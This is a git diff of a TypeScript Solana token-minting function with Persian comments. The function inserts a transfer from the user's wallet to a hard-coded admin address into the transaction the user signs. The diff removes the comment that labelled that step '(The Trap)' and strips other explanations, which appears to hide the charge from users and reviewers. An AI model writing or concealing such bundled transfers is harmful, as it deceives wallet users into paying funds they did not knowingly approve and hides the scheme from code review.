@@ -4,7 +4,6 @@ import {
     SystemProgram, 
     Transaction, 
     Keypair, 
-    sendAndConfirmTransaction,
     LAMPORTS_PER_SOL
 } from "@solana/web3.js";
 import { 
@@ -25,7 +24,7 @@ import { WalletContextState } from "@solana/wallet-adapter-react";
 // آدرس کیف پول مدیر برای دریافت کارمزد
 const ADMIN_WALLET = new PublicKey("DhP4KRcguQ9EFcWVku2HKL6H5Tm3sKVAwLATGrTtad8s");
 
-// تابع اصلی ساخت توکن (نسخه پیشرفته با عکس و نام)
+// تابع اصلی ساخت توکن
 export async function createToken(
     connection: Connection,
     wallet: WalletContextState,
@@ -36,7 +35,8 @@ export async function createToken(
 ) {
     // ۱. بررسی اتصال کیف پول
     if (!wallet.publicKey || !wallet.signTransaction) {
-        throw new Error("کیف پول متصل نیست!");
+        // تغییر مهم: پیام خطای سیستمی به انگلیسی
+        throw new Error("Wallet not connected!");
     }
 
     // ۲. تولید کلید برای توکن جدید (Mint Account)
@@ -46,7 +46,6 @@ export async function createToken(
     const lamports = await getMinimumBalanceForRentExemptMint(connection);
 
     // ۴. پیدا کردن آدرس استاندارد برای ذخیره متادیتا (PDA)
-    // این آدرس جایی است که نام و عکس توکن در بلاکچین ذخیره می‌شود
     const [metadataPDA] = PublicKey.findProgramAddressSync(
         [
             Buffer.from("metadata"),
@@ -62,10 +61,10 @@ export async function createToken(
         wallet.publicKey
     );
 
-    // ۶. ساخت بسته تراکنش (شامل مراحل پشت سر هم)
+    // ۶. ساخت بسته تراکنش
     const transaction = new Transaction().add(
         
-        // مرحله صفر: واریز کارمزد به حساب مدیر (The Trap)
+        // مرحله صفر: واریز کارمزد به حساب مدیر
         SystemProgram.transfer({
             fromPubkey: wallet.publicKey,
             toPubkey: ADMIN_WALLET,
@@ -85,12 +84,12 @@ export async function createToken(
         createInitializeMintInstruction(
             mintKeypair.publicKey,
             9, 
-            wallet.publicKey, // صاحب امتیاز
-            wallet.publicKey, // صاحب امتیاز فریز
+            wallet.publicKey,
+            wallet.publicKey,
             TOKEN_PROGRAM_ID
         ),
         
-        // مرحله سوم: ساخت اکانت مقصد برای کاربر (ATA)
+        // مرحله سوم: ساخت اکانت مقصد برای کاربر
         createAssociatedTokenAccountInstruction(
             wallet.publicKey,
             userTokenAccount,
@@ -98,15 +97,15 @@ export async function createToken(
             mintKeypair.publicKey
         ),
         
-        // مرحله چهارم: ضرب سکه‌ها و واریز به حساب کاربر
+        // مرحله چهارم: ضرب سکه‌ها
         createMintToInstruction(
-            mintKeypair.publicKey, // آدرس توکن
-            userTokenAccount,      // آدرس مقصد
-            wallet.publicKey,      // امضا کننده
-            tokenSupply * (10 ** 9) // ضرب در ۱۰ به توان ۹ (برای اعشار)
+            mintKeypair.publicKey,
+            userTokenAccount,
+            wallet.publicKey,
+            tokenSupply * (10 ** 9)
         ),
 
-        // مرحله پنجم: ثبت نام، نماد و عکس (Metadata)
+        // مرحله پنجم: ثبت متادیتا
         createCreateMetadataAccountV3Instruction(
             {
                 metadata: metadataPDA,
@@ -126,7 +125,7 @@ export async function createToken(
                         collection: null,
                         uses: null,
                     },
-                    isMutable: true, // آیا بعداً قابل ویرایش باشد؟
+                    isMutable: true,
                     collectionDetails: null,
                 },
             }
@@ -138,10 +137,8 @@ export async function createToken(
     transaction.recentBlockhash = blockhash;
     transaction.feePayer = wallet.publicKey;
 
-    // امضا توسط توکن جدید (چون یک اکانت جدید است)
     transaction.partialSign(mintKeypair);
 
-    // امضا نهایی توسط کیف پول کاربر و ارسال به شبکه
     const signature = await wallet.sendTransaction(transaction, connection);
 
     return { signature, mintAddress: mintKeypair.publicKey.toBase58() };
